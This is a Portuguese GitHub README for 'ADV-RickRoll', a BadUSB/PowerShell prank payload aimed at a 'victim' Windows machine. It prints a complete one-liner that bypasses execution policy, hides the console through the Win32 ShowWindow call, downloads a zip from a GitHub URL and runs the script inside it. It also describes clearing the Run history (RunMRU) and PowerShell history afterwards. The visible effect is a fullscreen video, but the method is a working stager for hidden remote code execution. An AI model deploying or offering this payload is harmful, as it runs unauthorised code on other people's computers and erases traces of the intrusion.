
<h1 align="center">
  ADV-RickRoll (Atualizado / Recriado) 😈
</h1>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#executing-program">Executing Program</a></li>
    <li><a href="#modifications--improvements">Modifications & Improvements</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# ADV-RickRoll

Um script avançado de Rick Roll desenvolvido para dispositivos BadUSB (USB Rubber Ducky, Flipper Zero, etc.) ou execução direta via PowerShell no Windows.

## Description

Este programa executa um Rick Roll completo no alvo:
1. Oculta instantaneamente a janela do console.
2. Faz o download do pacote contendo o vídeo e o script.
3. Aguarda detecção de movimento do mouse (indicando que a vítima voltou ao computador).
4. Dispara o vídeo em tela cheia com volume no máximo através de uma interface nativa WPF.
5. Limpa os vestígios temporários, histórico do Executar (RunMRU) e histórico do PowerShell.

> **Nota:** Como o servidor original (`jakoby.lol`) foi desativado, esta versão foi atualizada para utilizar o GitHub como servidor de hospedagem direto e permanente.

## Getting Started

### Dependencies

* Conexão com a Internet ativa
* Windows 10 ou 11
* PowerShell habilitado

### Executing program

* Conecte o dispositivo BadUSB ou execute o comando na caixa Executar (`Win + R`):

```powershell
powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
```

## Modifications & Improvements

* **Unificação do StageOne:** A lógica que antes ficava em um arquivo separado (`StageOne.txt`) — incluindo a chamada antecipada à API Win32 `ShowWindow` para ocultar instantaneamente o console e a rotina de download/extração — foi integrada diretamente ao comando único de `ADV-RickRoll.txt`. O arquivo residual `StageOne.txt` foi eliminado, tornando o payload 100% autônomo (standalone).
* **Servidor Substituído:** Substituição do endpoint inativo `jakoby.lol/qee` pelo link direto no GitHub (`https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip`).
* **Resolução Dinâmica de Caminho:** O `rr.ps1` agora busca o `rr.mp4` automaticamente no diretório do script (`$PSScriptRoot`), na pasta temporária ou em `$env:TMP\rr\rr.mp4`, corrigindo a falha original que impedia a reprodução dependendo de onde o arquivo era extraído.
* **Ocultação de Janela (Win32 API) & Carregamento Seguro:** Chamada direta para `ShowWindow(MainWindowHandle, 0)` protegida contra carregamentos duplicados de tipos .NET (`Add-Type`), garantindo que o console permaneça invisível sem disparar exceções de tipo repetido.
* **Limpeza Refinada:** Remoção específica dos arquivos do payload (`rr.zip`, pasta `rr\`, etc.) antes da limpeza genérica.

## Contributing

* Original por: **I am Jakoby**
* Atualização & Recriação por: **xJCPMSx**

## Acknowledgments

* [Hak5](https://hak5.org/)
* [I am Jakoby](https://github.com/I-Am-Jakoby)
